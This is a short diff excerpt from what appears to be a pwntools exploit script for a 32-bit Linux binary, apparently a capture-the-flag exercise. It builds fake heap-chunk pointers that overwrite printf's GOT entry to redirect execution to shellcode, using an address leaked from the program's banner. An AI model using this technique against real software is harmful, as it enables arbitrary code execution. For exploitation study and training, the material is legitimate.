@@ -319,7 +319,7 @@ from pwn import *
 context(arch='i386', os='linux')
 
 printf_got = 0x804c004
-array_10_addr = 0x...   # leaked from banner output "loc=0xADDR"
+array_10_addr = measured_array_address   # leaked from banner output "loc=0xADDR"
 
 payload  = p32(printf_got - 8)       # fake fd -> target = printf GOT (minus 8 for offset)
 payload += p32(array_10_addr + 8)    # fake bk -> value = addr of shellcode jump
